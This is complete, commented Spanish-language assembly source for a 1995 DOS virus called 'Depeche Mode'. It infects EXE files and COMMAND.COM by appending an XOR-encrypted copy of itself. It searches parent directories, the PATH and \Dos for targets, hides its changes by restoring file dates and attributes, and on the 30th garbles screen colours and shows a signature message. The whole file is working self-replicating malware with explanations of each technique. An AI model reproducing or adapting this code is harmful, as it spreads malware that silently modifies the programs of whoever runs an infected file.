; Virus Depeche Mode.
; Programado Por Walt DiZnEy.
; Infectador No Residente De EXEs e Int‚rprete De Comandos.

; Finalizado En Madrugada Del Domingo 28 De Marzo De 1995.

; Archivo Azul Nro. 001; 15/8/1995.



; Identificador De Infecci¢n Del Virus. Puede Ser Cualquiera De Dos
; Caracteres (Ocupa Una Palabra En Memoria).

ID = '&^'

Segmento	Segment Byte Public
		Assume Cs:Segmento; Ds:Segmento; Es:Segmento; Ss: Segmento
		Org 100h

Codigo:

; ************************************************************************
; ************************** BLOQUE PRINCIPAL ****************************
; ************************************************************************

Comienzo 	Proc Near

		; Primero, Calculamos 'Donde' Estamos.
		; El Desplazamiento a Sumar Nos Queda En Bp.

		Call Posicion
Posicion:	Pop Bp
		Sub Bp, OffSet(Posicion) 

		; Salvamos Es y Ds Originales (Apuntan Al Segmento Del PSP).

		Push Ds
		Push Es

		; Hacemos Ds=Cs. Todav¡a No Tocamos Es, Ya Que Vamos a
		; Necesitar Su Contenido.

		Push Cs
		Pop Ds

Encriptar:
		Lea Si, [Bp+EncCod]
		Lea Di, [Bp+Final]		
EncBucle:
		Mov Al, Byte Ptr [Si]
		Db 34h			; Xor Al, ...
Clave		Db 0			; 0 Al Principio.
		Mov Byte Ptr [Si], Al
		Cmp Si, Di
		Jz EncCod
		Inc Si
		Jmp EncBucle

EncCod:
		; Control De Infecci¢n Por Path A 0. Este Contador
		; Es Utilizado Alternativamente Por La T‚cnica 3, Para
		; Se¤alar Que Ya Se Busc¢ Mediante Ella.

		Mov Byte Ptr[Bp+EndTrav], 0

		; Contador De Infecciones A 0.

		Mov Byte Ptr[Bp+Counter], 0

		; Salvamos 'Tipo' De Infecci¢n

		Mov Al, Byte Ptr[Bp+TipoInfeccion]
		Mov Byte Ptr[Bp+SaveTipo], Al

		; Creamos Un DTA Auxiliar.

		Lea Dx, [Bp+OffSet AuxDTA]
		Call SetDTA

		; Es El Int‚rprete De Comandos?

		Cmp Byte Ptr[Bp+TipoInfeccion], 'C'

		; S¡. Pasemos Por Arriba De Varias Cosas Que No Nos
		; Interesan En Este Caso, Como Buscar El Path, Etc.
		; (El Path No Est  Definido Cuando Arranca El
		; Int‚rprete).

		Jz EsUnCOM

		; Obtenemos La Direcci¢n Del PATH (Aqu¡ Usamos Es).

		Call LocatePath

		; Obtenemos La Direcci¢n Del COMSPEC (Volvemos A Usar Es).

		Call LocateCOMSPEC

		; Ahora S¡, Hacemos Es=Cs

		Push Cs
		Pop Es

		; Creamos El Salto Al EXE Original (Ser  Usado
		; M s Tarde), y Salvamos Ss:Sp En Un Lugar A Tal Prop¢sito.

		Lea Si, [Bp+OffSet SvSalto]
		Lea Di, [Bp+OffSet OrgSalto]
		Mov Cx, 4
		Cld
		Rep MovSw

		; Probemos Infectar El Int‚rprete De Comandos...

		Call InfectCommand

		; Control De T‚cnica De B£squeda De Directorios A 0.

		Mov Byte Ptr[Bp+Technique], 0

		; Saltamos Al C¢digo Principal.

		Jmp Activo

EsUnCOM:
		; Restauremos El Salto...

		Cld		
		Lea Si, [Bp+SvSalto]
		Mov Di, 100h
		Mov Cx, 3
		Rep MovSb

		; El Int‚rprete Infectado No Realiza Los 'Traversals'
		; Est ndar, Sino Que Busca Exclusivamente En El 
		; Directorio Del Dos (Presumiendo Que Es \Dos). Lo
		; Llamamos Tecnica 3.

		Mov Byte Ptr[Bp+Technique], 3

Activo:
		; Salvamos Directorio Original.

		Call SaveOrgDir

		; Comenzamos A Buscar...

Primero:
		Mov Ah,	4Eh
		Mov Cx, 0
		Lea Dx, [Bp+OffSet Archivo]
		Int 21h
		Jc OtroLugar

Bucle_1:

		Call Infeccion

		Cmp Byte Ptr[Bp+Counter], 3	; 3 Infecciones x Corrida!
		Jge Salida_Main

Siguiente:

		Mov Ah, 4Fh
		Int 21h
		JnC Bucle_1

OtroLugar:
		; Queda Alguna T‚cnica Por Utilizar?
		; EndTrav Se¤ala Si Termino El Path, o Alternativamente,
		; Si Ya Probamos La T‚cnica 3. En Cualquier Caso, Si Est 
		; En Uno, Ya No Hay Nada M s Que Probar.

		Cmp Byte Ptr[Bp+EndTrav], 1

		; No, Salimos.

		Jz Salida_Main

		; Veamos Que T‚cnica Tenemos Que Utilizar...

		Cmp Byte Ptr[Bp+Technique], 1
		Jz ByPath

		Cmp Byte Ptr[Bp+Technique], 3
		Jz IntoDos

		; Probamos 'Subir' En El Arbol De Directorios...

		Lea Dx, [Bp+DotDot]
		Call SetDir
		Jnc Primero

		; Agotamos 'DotDot', Cambiemos A B£squeda En Path.

		Mov Byte Ptr[Bp+Technique], 1

		; Probamos En Los Directorios Del Path...

ByPath:
		Call TraversePath
		Jmp Primero

IntoDos:
		; T‚cnica 3: Buscar En El Directorio '\Dos'. Es
		; Exclusiva Del Int‚rprete Infectado.

		Lea Dx, [Bp+DosDirectory]
		Mov Byte Ptr[Bp+EndTrav], 1
		Call SetDir
		Jnc Primero

Salida_Main:
		; Restauramos Directorio Original.

		Lea Dx, [Bp+OrgDir]
		Call SetDir

		; Es D¡a 30?

		Mov Ah, 2Ah
		Int 21h

		Cmp Dl, 30
		Jnz NoJoke

		Call ColorJoke
NoJoke:
		; Devolvemos El Control Al Programa Original.

 		; Restauramos Es/Ds ORIGINALES (Los Hab¡amos Hecho Apuntar A 
		; Cs). Estos Es, Ds Originales Apuntan Al PSP.

	        Pop Es                                
        	Pop Ds                                

		; Restauramos El DTA Original. Este Est  Ubicado En El
		; Desplazamiento 80h Del PSP. Si Nos Fijamos, Ahora Que
		; Restauramos Ds, Cargando Dx Con 80h, Hacemos Que El
		; DTA Se Ubique En Su Posici¢n Original.

		Mov Dx, 80h
		Call SetDTA

		; Es El COMMAND.COM ?

		Cmp Byte Ptr Cs:[Bp+SaveTipo], 'C'

		; S¡, Restauremos Como .COM

		Jz Salida_COM

		; Estos Es/Ds Originales Apuntan Al Segmento Del PSP.

		; Preparamos Salto

		; Cargamos Ax Con Es. Le Sumamos 10h Al Segmento, Lo Que
		; Es Igual Que Sumarle 100h (10hx10h) Al OffSet. Por Lo
		; Tanto, Equivale A Pasar Por Arriba Del PSP (Q' Ocupa
		; 100h Bytes).
	
        	Mov Ax, Es				  
	        Add Ax, 10h				  

		; La Direccion De Comienzo Del Programa Es Relativa Al
		; Comienzo Del Espacio Destinado Al Programa.
		; Como Los Primeros 100h Bytes Del Programa Son Destinados
		; Al PSP, Debemos Considerar Esa Direcci¢n En Forma
		; Relativa Al Final Del PSP (Que Calculamos En Ax). Por Lo
		; Tanto, Sumamos Ax Al Segmento De Ejecuci¢n 'Inicial'.
		; (No Tenemos Que Preocuparnos Por Ip, Ya Que Este Es
		; Relativo A Cs).

        	Add Word Ptr Cs:[Bp+OrgSalto+2], Ax        

		; La Direcci¢n Del Segmento De Stack Tambi‚n Es Relativa 
		; Al Comienzo Del Ejecutable. 

        	Add Ax, Word Ptr Cs:[Bp+OrgStack+2]

		; Interrupciones 'Desactivadas'. Lo Hacemos Para Poder
		; Manipular El Stack.

	        Cli                                       

		; Colocamos Ss:Sp Con Los Valores Correspondientes
		; Al .EXE Original.

	        Mov Sp, Word Ptr Cs:[Bp+OrgStack]
	        Mov Ss, Ax

		; Interrupciones 'Activadas'

        	Sti

		; Salto A La Direcci¢n De Comienzo Del .EXE Original

	        Db      0eah                              ; Jmp Far Seg:Ofs

		OrgSalto   dd ?                                
		OrgStack   dd ?                                 

Salida_COM:

		Mov Ax, 100h
		Push Ax
		Ret

	        Endp	

; ************************************************************************
; **************************** PROCEDIMIENTOS ****************************
; ************************************************************************


; *** 1) Infeccion: Realiza El Proceso De Infecci¢n De Un Archivo .EXE; El
;		    Archivo Se Le Pasa En El DTA, Como Resultado De Una
; 		    B£squeda.

Infeccion	Proc Near

		; Abrimos El Archivo Para Lectura.

		Mov Al, 0 ; S¢lo Lectura.
		Lea Dx, [Bp+AuxDTA+1Eh]
		Call OpenFile

		; Puntero Al Principio
		
		Mov Cx, 0
		Mov Dx, 0
		Mov Al, 0
		Call SetFilePtr

		; Cargamos La Parte Fija o Est ndar De La Cabecera 
		; Del .EXE. Los Bytes a Partir Del OffSet 1Ch Son Para
		; Utilizaci¢n Particular De Cada Software. (Ver En Lista
		; De Ralph Brown).

		Mov Ah, 3Fh
		Mov Cx, 1Ah
		Lea Dx, [Bp+EXECab]
		Int 21h

		; Vemos Si No Est  Infectado Ya

		; La Identificaci¢n Del Infecci¢n Est  En El OffSet 12h De La
		; Cabecera Del .EXE (Ese OffSet Es Poco Usado).

		; Comparamos y Verificamos...

		Cmp Word Ptr[Bp+ExeCab+12h], ID

		; Si No Est  Infectado, Infectamos!.

		Jnz Infectamos

		; y Sino, Salimos...

		Jmp Salida_1

Infectamos:
		; Cerramos El Archivo (En Formato Lectura).

		Call CloseFile

		; No Est  Infectado. Pasamos A Infectar.

		; Salvamos Los Cs:Ip Originales Que Est n En Los OffSets
		; 14h (Ip) y 16h (Cs) De La Cabecera Del EXE. 

	        Les Ax, Dword Ptr [Bp+EXECab+14h]        ; Ax>Ip Es>Cs  
                Mov Word Ptr [Bp+SvSalto], Ax            ; Los_
	        Mov Word Ptr [Bp+SvSalto+2], Es	         ; Salvamos

		; Salvamos Los Ss:Sp Originales Que Est n En Los OffSets
		; 0Eh (Ss) y 10h (Sp) De La Cabecera Del EXE.

	        Les Ax, Dword Ptr [Bp+EXECab+0Eh]        ; Ax>Ss Es>Sp   
	        Mov Word Ptr [Bp+SvStack], Es            ; Los_
        	Mov Word Ptr [Bp+SvStack+2], Ax	         ; Salvamos

		; Obtenemos El Tama¤o De La Cabecera En P rrafos (Est 
		; En El OffSet 8h De La Cabecera).

	        Mov Ax, Word Ptr [bp+EXECab+8h]        
		Mov Dx, 0

		; Para Obtener Su Tama¤o En Bytes, La Multiplicamos Por 16
		; (Ya Que, Obviamente, Una Cantidad En P rrafos Se Expresa 
		; Como: Cantidad Div 16). 

		Mov Cl, 4
		Shl Ax, Cl

		; Intercambiamos Ax Con Bx, Ya Que Necesitamos Ax y No
		; Queremos Perder El Resultado Del Tama¤o De La Cabecera.

	        XChg Ax, Bx				  

		; Cargamos La Longitud Del Archivo (Que Est  En El OffSet
		; 1Ah Del DTA) En Es:Ax.		

	        Les Ax,[Bp+Offset AuxDTA+1Ah]             

		; Pasamos Es A Dx.

        	Mov Dx, Es                             

		; Salvamos La Longitud Original Del Archivo En El Stack.

	        Push Ax                                
        	Push Dx

		; Restamos A La Longitud Del Archivo, La Longitud De
		; La Cabecera (En Bx). N¢tese Que La Longitud De La Cabecera
		; Puede Variar, Ya Que Muchos Programas Utilizan Los Bytes Del
		; OffSet 1Ch En Adelante Para Usos Particulares.
		
	        Sub Ax, Bx                            
	        Sbb Dx, 0                              

		; Lo Convertimos Al Formato Segment:OffSet. Para Esto
		; Dividimos Dx:Ax Por 10h (16 Decimal). 

   		Mov Cx, 10h                            
	        Div Cx

		; Este Resultado (Tama¤o Archivo - Tama¤o Cabecera) Nos Da
		; Como Resultado Un Puntero Al Final Del Programa ORIGINAL,
		; Que, Cuando Tengamos El Virus Concatenado, Resultar  Ser
		; Un Puntero Al Comienzo Del Virus (Relativo Al Final De La
		; Cabecera).

		; Lo Salvamos En La 'Nueva' Cabecera.

	        Mov Word Ptr [Bp+EXECab+14h], Dx       		; Ip
	        Mov Word Ptr [Bp+EXECab+16h], Ax       		; Cs

		; Salvamos Tambi‚n El 'Nuevo' Ss, Que Ser  Igual a Cs.

	        Mov Word Ptr [Bp+EXECab+0Eh], Ax       

		; Hacemos Lo Mismo Con El 'Nuevo' Sp. 

		Mov Word Ptr[Bp+ExeCab+10h], 0A000h

		; Salvamos La 'Identificaci¢n' Del Virus, En El OffSet
		; 12h De La Nueva Cabecera. Este OffSet Est  Destinado
		; Originalmente A Guardar Un CheckSum Negativo Del .EXE,
		; Pero Es Poco Usado. Por Lo Tanto, Lo Utilizamos Para
		; Nuestro Prop¢sito.

	        Mov Word Ptr [Bp+EXECab+12h], ID       

		; Recuperamos La Longitud Original Del Archivo, Que Hab¡amos
		; Guardado En El Stack.

	        Pop Dx
   		Pop Ax				  

		; Le Sumamos La Longitud Del C¢digo Del Virus.

	        Add Ax, Final-Comienzo
        	Adc Dx, 0                              

		; Calculamos La Nueva Longitud Del Archivo. La Misma Est 
		; Expresada En Una Cantidad De P ginas De 512 Bytes (Que Se
                ; Guardan En Un OffSet), y La Cantidad De Bytes De La P gina
		; Final (Que Se Guardan En OTRO OffSet). 		

		Mov Cx, 0200h
		Div Cx

		Cmp Dx, 0		; ¨La Final Qued¢ Incompleta?

		Jz Completa		; No, Todo Bien. Sigamos.

		Inc Ax			; S¡. Cont‚mosla Igual Como Una
					; P gina M s: Ax --> Ax + 1.

Completa:		

		; Colocamos La Nueva Longitud En La Nueva Cabecera

	        Mov Word Ptr [Bp+EXECab+4], Ax         
        	Mov Word Ptr [Bp+EXECab+2], Dx

		; Hab¡amos Modificado Es, Por Lo Que Lo Restauramos, 
		; Poni‚ndolo Igual A Cs.

	        Push Cs                                
        	Pop Es

		; A Continuaci¢n, Pasamos A Escribir La Nueva Cabecera.

		; Salvamos Los Atributos Del Archivo Hu‚sped.

		Lea Dx, [Bp+AuxDTA+1Eh]
		Call SaveAttr

		; Colocamos Atributos a 'Archive'.

		Call ArchiveAttr

		; Abrimos Para Escritura.

		Mov Al, 02h
		Lea Dx, [Bp+AuxDTA+1Eh]
		Call OpenFile

		; Salvamos Fecha/Hora Originales Del Hu‚sped.

		Call SaveD&T

		; Ponemos El Puntero Al Principio.

		Mov Cx, 0
		Mov Dx, 0
		Mov Al, 0
		Call SetFilePtr

		; y Escribimos La Cabecera.

	        Mov Cx, 1Ah                            
	        Mov Ah, 40h                            
	        Lea Dx,[Bp+EXECab]                    
	        Int 21h

		; Ahora Pasaremos A Agregar El C¢digo V¡rico...

		; Aclaramos Que Infectamos Un .EXE.

		Mov Byte Ptr[Bp+TipoInfeccion], 'E'

		; Puntero Al Final Del Archivo		

		Mov Cx, 0
		Mov Dx, 0
		Mov Al, 02h
		Call SetFilePtr

		; Encriptamos El Virus/Concatenamos/Desencriptamos/Retornamos.

		Call EnCrypt&Write

		; Le Colocamos Su Fecha/Hora Originales Al Archivo.

		Call RestoreD&T

		; Cerramos El Archivo.

		Call CloseFile

		; Le Colocamos Sus Atributos Originales.

		Lea Dx, [Bp+AuxDTA+1Eh]
		Call RestoreAttr

		; Contabilizamos Infecci¢n...

		Inc Byte Ptr[Bp+Counter]

		; y Retornamos!
Salida_1:
		Ret
		
		EndP


; *** 2) OpenFile: Abre El Archivo Que Se Le Pasa En Dx (AsciiZ).

OpenFile	Proc Near

		; Al=00h Lectura / Al=01h Escritura / Al=02h Ambos.
		
		Mov Ah, 3Dh
		Int 21h

		; Pasamos El Handle A Bx.
		
		Mov Bx, Ax

		Ret

		EndP


; *** 3) CloseFile:  Cierra El Archivo Cuyo Handle Est  En Bx.

CloseFile	Proc Near
		
		Mov Ah, 3Eh
		Int 21h
		Ret

		EndP


; *** 4) SaveD&T: Salva La Fecha y Hora Originales Del Archivo De Handle Bx.

SaveD&T		Proc Near
	
		Mov Ah, 57h
		Mov Al, 00h
		Int 21h

		Mov Word Ptr[Bp+OrgDate], Dx
		Mov Word Ptr[Bp+OrgTime], Cx
		Ret

		EndP


; *** 5) RestoreD&T: Restaura La Fecha y Hora Del Archivo De Handle Bx.

RestoreD&T	Proc Near

		Mov Dx, Word Ptr[Bp+OrgDate]
		Mov Cx, Word Ptr[Bp+OrgTime]

		Mov Ah, 57h
		Mov Al, 01h
		Int 21h
		Ret

		EndP


; *** 6) SaveAttr: Salva Los Atributos Del Archivo En Dx (AsciiZ).

SaveAttr	Proc Near

		Mov Al, 00h
		Mov Ah, 43h
		Int 21h

		Mov Word Ptr[Bp+OrgAttr], Cx
		Ret
		
		EndP


; *** 7) RestoreAttr: Restaura Los Atributos Del Archivo En Dx (AsciiZ).

RestoreAttr     Proc Near

 		Mov Al, 01h
 		Mov Cx, Word Ptr[Bp+OrgAttr]
		Mov Ah, 43h
		Int 21h
		Ret

		EndP


; *** 8) ArchiveAttr: Coloca Atributos 'Archive' Al Archivo En Dx (AsciiZ).

ArchiveAttr	Proc Near

		Mov Al, 01h
		Mov Cx, 20h
		Mov Ah, 43h
		Int 21h
		Ret

		EndP


; *** 9) SetDTA: Setea El DTA En La Direcci¢n Que Se Le Pasa En Dx.

SetDTA		Proc Near

		Mov Ah, 1Ah
		Int 21h
		Ret

		EndP


; *** 10) SetFilePtr: Coloca El Puntero Del Archivo En La Posici¢n Dada.

SetFilePtr	Proc Near

		Mov Ah, 42h
		Int 21h
		Ret

		EndP


; *** 11) SaveOrgDir: Salva El Directorio 'Original'.

SaveOrgDir	Proc Near

		Mov Byte Ptr[Bp+OrgDir], '\'

		Mov Ah, 47h
		Mov Dl, 00h
		Lea Si, [Bp+OrgDir+1]
		Int 21h
		Ret

		EndP


; *** 12) SetDir: Cambia El Directorio 'Activo'.

SetDir    	Proc Near

		Mov Ah, 3Bh
		Int 21h
		Ret

		EndP


; *** 13) LocatePath: Ubica La Variable PATH En El Enviroment, y Guarda La
;                     Ubicaci¢n De Su Contenido.

LocatePath      Proc Near

		Push Es

		; Colocamos En Es La Direcci¢n Del Segmento De Enviroment.

		Mov Es, Word Ptr Es:[002Ch]	

		; Empezamos A Buscar En 0.

		Mov Di, 00h

		; Buscamos La Cadena 'Path'

		; 1ro, Buscamos Una 'P'...

Bucle_13:  	Lea Si, [Bp+ CadenaPath]
		LodSb				
		Mov Cx,08000h		
		RepNe ScaSb				
		
		; La Hallamos, Chequeamos Si Lo Que Sigue Es 'ath='.

		Mov Cx,4			
Siguientes_4:	LodsB				
		ScasB				

		; No Es, Sigamos Buscando...

		Jne Bucle_13

		; Puede Ser, Sigamos Viendo.

		Loop	Siguientes_4

		; Guardamos La Direcci¢n Del Path (Segmento:OffSet).

		Mov Word Ptr [Bp+DirPath], Di	
		Mov Word Ptr [Bp+DirPath + 2], Es  

		; y Retornamos.

		Pop Es

		Ret
		EndP


; *** 14) LocateComSpec: Ubica La Variable ComSpec En El Enviroment, y
;			 Guarda La Ubicaci¢n De Su Contenido.

LocateCOMSPEC   Proc Near

		Push Es

		; Colocamos En Es La Direcci¢n Del Segmento De Enviroment.

		Mov Es, Word Ptr Es:[002Ch]	

		; Empezamos A Buscar En 0.

		Mov Di, 00h

		; Buscamos La Cadena 'COMSPEC'

		; 1ro, Buscamos Una 'P'...

Bucle_14:  	Lea Si, [Bp+ COMSPEC]
		LodSb				
		Mov Cx,08000h		
		RepNe ScaSb				
		
		; La Hallamos, Chequeamos Si Lo Que Sigue Es 'OMSPEC='.

		Mov Cx,7
Siguientes_4M:	LodsB				
		ScasB				

		; No Es, Sigamos Buscando...

		Jne Bucle_14

		; Puede Ser, Sigamos Viendo.

		Loop	Siguientes_4M

		; Guardamos La Direcci¢n Del Path (Segmento:OffSet).

		Mov Word Ptr [Bp+DirCOMS], Di	
		Mov Word Ptr [Bp+DirCOMS + 2], Es  

		; y Retornamos.

		Pop Es

		Ret
		EndP


; *** 15) TraversePath: 'Viaja' A Trav‚s Del Path.

TraversePath	Proc Near

		; Ahora, Empezamos A Buscar Directorios En El Path.

		; Cargamos Ds:Si Con La Direcci¢n Del Path.

		Lds Si, DWord Ptr[Bp+DirPath]

Sigamos_15:
		; ...y Es:Di Con El Espacio Reservado P/El Directorio.

		Lea Di, [Bp+ AuxDir]
Bucle_15:
		LodSb
		Cmp Al, ';'
		Je Salida_15_Ok
		Cmp Al, 0
		Je Salida_15_NotOk
		StoSb
		Jmp Bucle_15

		; Salida_15_NotOk Indica Que Ya No Hay M s Donde Buscar.

Salida_15_NotOk:
		; Se¤alamos Que Ya No Hay Donde Moverse.

		Mov Byte Ptr[Bp+EndTrav], 1

Salida_15_Ok:
		; Actualizamos El Puntero Al Pr¢ximo Directorio

		Mov Word Ptr[Bp+DirPath], Si

		; Recuperemos Los Registros.

		Push Cs
		Pop Ds

		; Colocamos El Cero En La Cadena AsciiZ

		Mov Byte Ptr[Di], 0

		; Nos Movemos A Ese Directorio.

		Lea Dx, [Bp+AuxDir]
		Call SetDir

		; Y Retornamos.

		Ret

		EndP

; 16) InfectCommand: Infecta El Int‚rprete De Comandos Seteado En El ComSpec.
;		     (S¢lo Infecta Command.Com, Para Evitarse Problemas Con
;		      Otros Int‚rpretes, Como 4Dos, Etc).

InfectCommand	Proc Near

		; Buscamos En El COMSPEC...

		; Cargamos Ds:Si Con La Direcci¢n Del COMSPEC.

		Lds Si, DWord Ptr[Bp+DirCOMS]

		; ...y Es:Di Con El Espacio Reservado P/Esa Cadena.

		Lea Di, [Bp+AuxCOMSPEC]
Bucle_16:
		LodSb
		StoSb
		Cmp Al, 0
		Jnz Bucle_16

		; Restauramos Ds.

		Push Cs
		Pop Ds

		; Nos Fijamos Si Encontramos El Int‚rprete De Comandos.

		Lea Dx, [Bp+AuxCOMSPEC]
		Mov Ah, 4Eh
		Mov Cx, 0
		Int 21h

		; Si No Est , Salimos.

		Jnc Seguir_16_1
		Jmp Salir_16
Seguir_16_1:
		; ¨Es Demasiado Largo?

		Cmp Word Ptr[Bp+AuxDTA+1Ah], 63000

		Jbe Seguir_16_2
		Jmp Salir_16

Seguir_16_2:
		; ¨Es El Command.Com?

		Cmp Word Ptr[Bp+AuxDTA+1Eh+5], 'DN'
		Je Seguir_16_3
		Jmp Salir_16

Seguir_16_3:
		; Abrimos El Archivo.

		Mov Al, 2 ; Lectura/Escritura
		Lea Dx, [Bp+AuxComSpec]
		Call OpenFile
		
		; Puntero Al Principio
		
		Mov Cx, 0
		Mov Dx, 0
		Mov Al, 0
		Call SetFilePtr

		; Salvamos Los 3 Primeros Bytes Del Archivo. Aprovechamos
		; El Lugar Donde Salvamos El Salto De Los EXEs.

		Mov Ah, 3Fh
		Mov Cx, 3
		Lea Dx, [Bp+SvSalto]
		Int 21h

		; Vemos Si No Est  Infectado Ya

		; Segundos Dos Bytes Del Archivo En Ax.

		Mov Ax, Word Ptr[Bp+SvSalto+1]

		; El Salto Que Deber¡a Haber Si Est  Infectado, En Cx.

		Mov Cx, Word Ptr[Bp+AuxDta+1Ah]

		; Comparamos y Verificamos...

		Sub Cx, (Final-Comienzo)+3
		Cmp Ax, Cx

		; Ya Est  Infectado, Salimos.

		Jz Salir_16_2

		; Salvamos Los Atributos Originales Del Archivo.
		
		Call SaveAttr

		; Colocamos Atributos 'Archive'.

		Call ArchiveAttr

		; Salvamos La Fecha y Hora Originales Del Archivo.

		Call SaveD&T

		; Puntero Al Principio
		
		Mov Cx, 0
		Mov Dx, 0
		Mov Al, 0
		Call SetFilePtr

		; Constru¡mos El Salto Al C¢digo V¡rico.

		Mov Byte Ptr[Bp+SaltoV], 0E9h
		Mov Ax, Word Ptr[Bp+AuxDta+1Ah]

		; Le Restamos 3 A La Longitud Del Archivo Original, Ya
		; Que El Salto Ocupa De Por S¡ 3 Bytes, y Si No Lo
		; Hicieramos, Estar¡amos Saltando 3 M s Adelante De Lo
		; Deseado.

		Sub Ax, 3
		Mov Word Ptr[Bp+SaltoV+1], Ax

		; Lo Escribimos Al Comienzo Del Archivo.

		Mov Ah, 40h
		Mov Cx, 3
		Lea Dx, [Bp+SaltoV]
		Int 21h

		; Puntero Al Final Del Archivo		

		Mov Cx, 0
		Mov Dx, 0
		Mov Al, 02h
		Call SetFilePtr

		; Indicamos Que Infectamos El Int‚rprete.

		Mov Byte Ptr[Bp+TipoInfeccion], 'C'

		Mov Byte Ptr[Bp+Clave], 0

		; Encriptamos/Concatenamos El Virus!

		Call Encrypt&Write

		; Contabilizamos Infecci¢n.

		Inc Byte Ptr[Bp+Counter]

		; Restauramos Fecha y Hora Originales.

		Call RestoreD&T

		; Restauramos Atributos Originales.

		Lea Dx, [Bp+AuxComSpec]
		Call RestoreAttr

		; y Retornamos

Salir_16_2:
		; Cerramos El Archivo.

		Call CloseFile

Salir_16:
		Ret
		
		EndP


; *** 17) EnCrypt&Write: Realiza El Proceso De Encriptar y Concatenar El Virus.

EnCrypt&Write	Proc Near

		; Colocamos Una Clave Pseudo-Aleatoria.
		; La Obtenemos De Las Centesimas De Segundo, y Le
		; Sumamos 1, Para Que Nunca Sea 0.

		Mov Ah, 2Ch
		Int 21h

		Inc Dl

		Mov Byte Ptr[Bp+Clave], Dl

		; Copiamos El Encriptador A Un Buffer

		Cld
		Lea Si, [Bp+Encriptar]
		Lea Di, [Bp+Buffer]
		Mov Cx, EncCod-Encriptar
		Rep MovSb

		; Copiamos El 'Concatenador' A Un Buffer

		Lea Si, [Bp+Concatenar]
		Mov Cx, EndCon - Concatenar
		Rep MovSb

		; Copiamos El Encriptador Nuevamente

		Lea Si, [Bp+Encriptar]
		Mov Cx, EncCod - Encriptar
		Rep MovSb

		; Agregamos Un Retorno

		Mov Byte Ptr[Di], 0C3h

		; ...Y Le Pasamos El Control!

		Call Buffer

		Ret

		EndP


; *** 18) Concatenar: Es El C¢digo Que Concatena El Virus. No Se Utiliza
;		      Como Subrutina, Sino Como C¢digo 'Suelto'.

Concatenar	Proc Near

		; Concatenamos El Virus!

		Mov Ah, 40h
		Mov Cx, Final - Comienzo
		Lea Dx, [Bp+Comienzo]
		Int 21h

EndCon:
		EndP


; *** 19) ColorJoke: Cambia Los Colores De Los Caracteres De La Pantalla, y
;		     Muestra El Mensaje Del Virus.

ColorJoke    	Proc Near

		; Salvamos Es

		Push Es

		; Detectamos Si Es Monocromo o Color.

		Mov Ah, 0Fh		; (Obtener Modo De Video)
		Int 10h
		
		Cmp Al, 7
		Jz Monocromo

		; Es Color...

		Mov Ax, 0b800h
		Jmp Proceso

Monocromo:	Mov Ax, 0b000h	
		
Proceso:    
		Mov Es, Ax
		Mov Bx, 0
Bucle_19:
		Mov Cl, Byte Ptr[Es:Bx]
		Inc Bx
		Mov Byte Ptr[Es:Bx], Cl

Continua_19:
		Inc Bx
		Cmp Bx, 3900
		Jng Bucle_19

		; Realizada La Broma, Mostramos El Mensaje.

		Lea Dx, [Bp+Msg]
		Mov Ah, 09h
		Int 21h

		; y Esperamos Unas Entradas...

		Mov Cx, 3
Bucle_19_2:
		Lea Dx, [Bp+Buffer]
		Mov Ah, 0Ah
		Int 21h
		Loop Bucle_19_2

		; Restauramos Es.

		Pop Es

		; Y Retornamos...
		
		Ret

		EndP


; ************************************************************************
; ******************************** DATOS *********************************
; ************************************************************************

Archivo   	Db '*.EXE',0
SvSalto   	Dd 0fff00000h			; Para El C¢digo Original, El 
						; Comienzo Del PSP (Int 20h).
SvStack   	Dd ?
DotDot    	Db '..', 0
CadenaPath 	Db 'PATH=', 0
ComSpec		Db 'COMSPEC=', 0
DosDirectory	Db '\Dos',0
TipoInfeccion	Db 'E'
Msg		Db 'Aguante DEPECHE MODE! Por Walt DiZnEy. Argentina, Mayo 1995.',10,13,'$'
Final:

; Zona De Datos Auxiliares

AuxDTA	 	Db 43 Dup(?)
EXECab 		Db 1Ah Dup(?)
OrgDir	 	Db 64 Dup(?)
AuxDir   	Db 64 Dup(?)
EndTrav  	Db ?
DirPath  	Dd ?
DirCOMS  	Dd ?
Counter  	Db ?
OrgAttr  	Dw ?
OrgTime  	Dw ?
OrgDate  	Dw ?
SaltoV   	Db 3 Dup(?)
SaveTipo 	Db ?
AuxCOMSPEC 	Db 78 Dup(?)
Technique	Db ?

Buffer:
	        Db (((EncCod-Encriptar)*2)+(EndCon-Concatenar)+1) Dup(?)

Segmento	EndS
		
		End Codigo



